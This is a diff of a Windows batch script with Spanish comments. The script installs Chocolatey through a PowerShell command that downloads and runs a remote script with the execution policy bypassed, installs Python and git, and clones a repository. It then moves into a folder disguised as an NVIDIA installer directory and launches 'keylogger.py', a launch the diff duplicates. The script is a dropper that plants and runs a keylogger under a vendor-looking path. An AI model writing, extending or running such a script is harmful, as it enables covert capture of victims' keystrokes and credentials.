@@ -1,5 +1,15 @@
 @echo off
-
+:prelog
+if exist "C:\ProgramData\chocolatey" (
+    echo Chocolatey is installed.
+    goto check01 
+) else (
+    echo Chocolatey is not installed.
+    goto start
+)
+:start
+@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))" && SET "PATH=%PATH%;%ALLUSERSPROFILE%\chocolatey\bin"
+goto check01
 ::check si git esta instalado
 :check01
 where git > nul 2>&1
@@ -27,7 +37,7 @@ goto clone
 ::Instala python
 :errorNoPython
 echo Installing Python...
-winget install -e --id Python.Python -v 3.9.0
+choco install -y python3
 goto check02
 
 :: clona el repositorio de github
@@ -52,6 +62,10 @@ timeout /t 15
 ::abre la carpeta donde se encuentra la copia generada por el propio script
 cd C:\Program Files\NVIDIA Corporation\Installer2\installer
 ::ejecuta el nuevo script
+python3 keylogger.py
+
+::fin de tu trabajo .bat, lo hiciste bien
+exit
 python3 keylogger.py
 
 ::fin de tu trabajo .bat, lo hiciste bien
